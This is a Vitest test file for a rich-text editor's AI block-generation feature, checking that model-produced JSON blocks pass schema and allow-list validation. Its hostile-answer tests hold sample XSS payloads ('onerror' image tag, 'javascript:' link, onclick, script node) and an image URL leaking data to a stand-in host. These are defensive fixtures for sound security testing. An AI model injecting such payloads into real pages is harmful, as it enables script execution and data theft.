// @vitest-environment jsdom
import { describe, expect, it } from 'vitest'
import {
  EditorState,
  Schema,
  TextSelection,
  basicSchemaSpec,
  history,
  parseHTML,
  serializeHTML,
  undo,
  type Fragment,
} from '@scriba-editor/core'
import { createTranslator } from '@scriba-editor/i18n'
import { EditorView } from '@scriba-editor/view'
import { imageNodes } from '@scriba-editor/plugin-image'
import { linkMarks } from '@scriba-editor/plugin-link'
import { mentionNodes } from '@scriba-editor/plugin-mention'
import { tableNodes } from '@scriba-editor/plugin-table'
import { taskNodes } from '@scriba-editor/plugin-task'
import { calloutNodes } from '@scriba-editor/plugin-callout'
import { commentMarks } from '@scriba-editor/plugin-comments'
import {
  MAX_AI_BLOCKS,
  acceptPending,
  aiAssistant,
  aiBlocksJsonSchema,
  aiBlocksPrompt,
  blockAiActions,
  blocksParser,
  getPending,
  runAi,
  type AiComplete,
  type AiRequest,
} from '../src/index.js'

/**
 * Generative blocks: the model answers with JSON nodes (NDJSON). Untrusted
 * input (§5.9): every block goes through the schema and the allowed list.
 */
const schema = new Schema({
  nodes: {
    ...basicSchemaSpec.nodes,
    ...tableNodes,
    ...taskNodes,
    ...calloutNodes,
    ...imageNodes,
    ...mentionNodes,
  },
  marks: { ...linkMarks, ...commentMarks, ...basicSchemaSpec.marks },
})
const t = createTranslator('it')
const html = (f: Fragment) => serializeHTML(schema.topNodeType.create(null, f))
const text = (s: string) => ({ type: 'text', text: s })
const para = (...c: object[]) => ({ type: 'paragraph', content: c })
const cell = (s: string, type = 'table_cell') => ({ type, content: [para(text(s))] })
const table = {
  type: 'table',
  content: [
    { type: 'table_row', content: [cell('Nome', 'table_header'), cell('Ruolo', 'table_header')] },
    { type: 'table_row', content: [cell('Anna'), cell('Dev')] },
  ],
}
const task = (title: string, due: string | null = null) => ({
  type: 'task',
  attrs: { title, due },
})
const lines = (...items: object[]) => items.map((i) => JSON.stringify(i)).join('\n')

describe('blocksParser', () => {
  it('one block per line, checked by the schema; code fences tolerated', () => {
    const parse = blocksParser({ nodes: ['task'] })
    const out = parse(
      '```json\n' + lines(task('Chiamare Anna', '2026-10-30'), task('Inviare report')) + '\n```',
      schema,
    )
    expect(out.childCount).toBe(2)
    expect(out.firstChild!.attrs).toMatchObject({ title: 'Chiamare Anna', due: '2026-10-30' })
  })

  it('while streaming, a half-written line waits; a JSON array is accepted too', () => {
    const parse = blocksParser({ nodes: ['task'] })
    const full = lines(task('uno'), task('due'))
    expect(parse(full.slice(0, full.length - 5), schema).childCount).toBe(1)
    expect(parse(JSON.stringify([task('a'), task('b')]), schema).childCount).toBe(2)
  })

  it('a table with header row', () => {
    const out = blocksParser({ nodes: ['table'] })(JSON.stringify(table), schema)
    expect(html(out)).toContain('<th><p>Nome</p></th>')
    expect(html(out)).toContain('<td><p>Anna</p></td>')
  })

  it('text that is not JSON becomes paragraphs (the model ignored the format)', () => {
    const out = blocksParser({ nodes: ['task'] })('Ecco le attività:\n' + lines(task('x')), schema)
    expect(html(out)).toBe(
      '<p>Ecco le attività:</p>' +
        html(blocksParser({ nodes: ['task'] })(lines(task('x')), schema)),
    )
  })
})

describe('blocksParser: hostile answers (§5.9)', () => {
  const parse = blocksParser({ nodes: ['table', 'task'] })

  it('types not allowed at the top level are dropped', () => {
    expect(
      parse(lines(para(text('x')), { type: 'heading', attrs: { level: 1 } }), schema).childCount,
    ).toBe(0)
  })

  it('no images or mentions inside (data could leave through an image URL)', () => {
    const bad = {
      ...table,
      content: [
        {
          type: 'table_row',
          content: [
            {
              type: 'table_cell',
              content: [para({ type: 'image', attrs: { src: 'https://evil.example/x?d=secret' } })],
            },
          ],
        },
      ],
    }
    const mention = {
      ...table,
      content: [
        {
          type: 'table_row',
          content: [
            {
              type: 'table_cell',
              content: [para({ type: 'mention', attrs: { id: 'u1', label: 'Anna' } })],
            },
          ],
        },
      ],
    }
    expect(parse(lines(bad, mention), schema).childCount).toBe(0)
  })

  it('no comments or suggestions (authors come from the server), no links unless allowed', () => {
    const marked = (type: string, attrs?: object) => ({
      ...table,
      content: [
        {
          type: 'table_row',
          content: [
            { type: 'table_cell', content: [para({ ...text('x'), marks: [{ type, attrs }] })] },
          ],
        },
      ],
    })
    expect(
      parse(
        lines(marked('comment', { id: 'c1' }), marked('link', { href: 'https://x.it' })),
        schema,
      ).childCount,
    ).toBe(0)
    expect(parse(lines(marked('bold')), schema).childCount).toBe(1)
    const withLinks = blocksParser({ nodes: ['table'], marks: ['link'] })
    expect(withLinks(lines(marked('link', { href: 'https://x.it' })), schema).childCount).toBe(1)
    // the URL whitelist still applies
    expect(
      withLinks(lines(marked('link', { href: 'javascript:alert(1)' })), schema).childCount,
    ).toBe(0)
  })

  it('invalid attributes, unknown types, markup in text, broken JSON', () => {
    const out = parse(
      [
        JSON.stringify(task('x', 'domani')), // not a date
        JSON.stringify({ type: 'script', content: [text('alert(1)')] }),
        JSON.stringify({ type: 'task', attrs: { title: 'a', onclick: 'alert(1)' } }),
        '{"type":"task","attrs":{"title":"<img src=x onerror=alert(1)>"}}',
        '{"type":"table", "content": [',
        JSON.stringify({ type: 'table', content: [] }), // invalid content
      ].join('\n'),
      schema,
    )
    const out2 = html(out)
    expect(out2).not.toMatch(/<img|<script|<[^>]*\son\w+=/)
    expect(out2).toContain('&lt;img src=x onerror=alert(1)&gt;') // text stays text
  })

  it('limits: nesting depth, number of blocks', () => {
    let deep: object = text('x')
    for (let i = 0; i < 30; i++) deep = { type: 'table', content: [deep] }
    expect(parse(JSON.stringify(deep), schema).childCount).toBe(0)
    const many = Array.from({ length: MAX_AI_BLOCKS + 50 }, (_v, i) =>
      JSON.stringify(task(`t${i}`)),
    )
    expect(parse(many.join('\n'), schema).childCount).toBe(MAX_AI_BLOCKS)
  })
})

describe('for the backend', () => {
  it('JSON Schema and instructions from the schema', () => {
    const json = aiBlocksJsonSchema(schema, { nodes: ['table'] }) as {
      $defs: { block: { properties: { type: { enum: string[] } } } }
    }
    expect(json.$defs.block.properties.type.enum).toEqual(['table'])
    const prompt = aiBlocksPrompt(schema, { nodes: ['table'] })
    expect(prompt).toContain('NDJSON')
    expect(prompt).toMatch(/- table_row:/)
    expect(prompt).not.toMatch(/- image:|- mention:/)
    expect(prompt).toContain('Marks: bold, italic, underline, strike, code')
  })

  it('blockAiActions only for the blocks the schema has', () => {
    expect(blockAiActions(schema).map((a) => [a.id, a.mode, a.blocks?.nodes])).toEqual([
      ['make_table', 'after', ['table']],
      ['extract_tasks', 'after', ['task']],
      ['to_callout', 'replace', ['callout']],
    ])
  })
})

describe('runAi with blocks', () => {
  it('asks for blocks, streams them as they complete, Accept is one undo step', async () => {
    const requests: AiRequest[] = []
    const answer = lines(task('Chiamare Anna'), task('Inviare report', '2026-10-30'))
    const complete: AiComplete = (req) => {
      requests.push(req)
      return (async function* () {
        for (let i = 0; i < answer.length; i += 7) yield answer.slice(i, i + 7)
      })()
    }
    const doc = parseHTML(
      schema,
      new DOMParser().parseFromString(
        '<p>Chiamare Anna e inviare il report entro il 30</p>',
        'text/html',
      ).body,
    )
    const view = new EditorView(document.createElement('div'), {
      state: EditorState.create({
        doc,
        selection: TextSelection.create(doc, 1, 46),
        plugins: [history(), ...aiAssistant({ complete, t })],
      }),
    })
    const action = blockAiActions(schema).find((a) => a.id === 'extract_tasks')!
    await runAi(
      view,
      { complete, t },
      { action: action.id, mode: action.mode, blocks: action.blocks! },
    )
    expect(requests[0]).toMatchObject({
      action: 'extract_tasks',
      output: 'blocks',
      blocks: { nodes: ['task'] },
    })
    expect(serializeHTML(view.state.doc)).toBe(
      '<p>Chiamare Anna e inviare il report entro il 30</p>' +
        '<div class="scriba-task" data-task="" data-done="false">Chiamare Anna</div>' +
        '<div class="scriba-task" data-task="" data-done="false" data-due="2026-10-30">Inviare report</div>',
    )
    expect(getPending(view.state)?.status).toBe('done')
    acceptPending(view)
    undo(view.state, (tr) => view.dispatch(tr), view)
    expect(serializeHTML(view.state.doc)).toBe(
      '<p>Chiamare Anna e inviare il report entro il 30</p>',
    )
  })

  it('a block that cannot go there: its text, never the raw JSON', async () => {
    // a table row on its own cannot stand in a paragraph
    const complete: AiComplete = async () => JSON.stringify(table.content[1])
    const doc = parseHTML(schema, new DOMParser().parseFromString('<p>ab</p>', 'text/html').body)
    const view = new EditorView(document.createElement('div'), {
      state: EditorState.create({
        doc,
        selection: TextSelection.create(doc, 2, 3),
        plugins: [history(), ...aiAssistant({ complete, t })],
      }),
    })
    await runAi(
      view,
      { complete, t },
      { action: 'x', mode: 'replace', blocks: { nodes: ['table_row'] } },
    )
    const out = serializeHTML(view.state.doc)
    expect(out).not.toContain('{')
    expect(out).toMatch(/Anna Dev/)
  })

  it('blocks replacing a phrase (a callout): Accept and one undo step work', async () => {
    const callout = { type: 'callout', attrs: { kind: 'info' }, content: [para(text('Nota'))] }
    const complete: AiComplete = async () => JSON.stringify(callout)
    const doc = parseHTML(
      schema,
      new DOMParser().parseFromString('<p>prima nota dopo</p>', 'text/html').body,
    )
    const view = new EditorView(document.createElement('div'), {
      state: EditorState.create({
        doc,
        selection: TextSelection.create(doc, 7, 11),
        plugins: [history(), ...aiAssistant({ complete, t })],
      }),
    })
    await runAi(
      view,
      { complete, t },
      { action: 'to_callout', mode: 'replace', blocks: { nodes: ['callout'] } },
    )
    acceptPending(view)
    expect(getPending(view.state)).toBeNull()
    const accepted = serializeHTML(view.state.doc)
    expect(accepted).toMatch(/^<p>prima <\/p><aside[^>]*><p>Nota<\/p><\/aside><p> dopo<\/p>$/)
    undo(view.state, (tr) => view.dispatch(tr), view)
    expect(serializeHTML(view.state.doc)).toBe('<p>prima nota dopo</p>')
  })
})
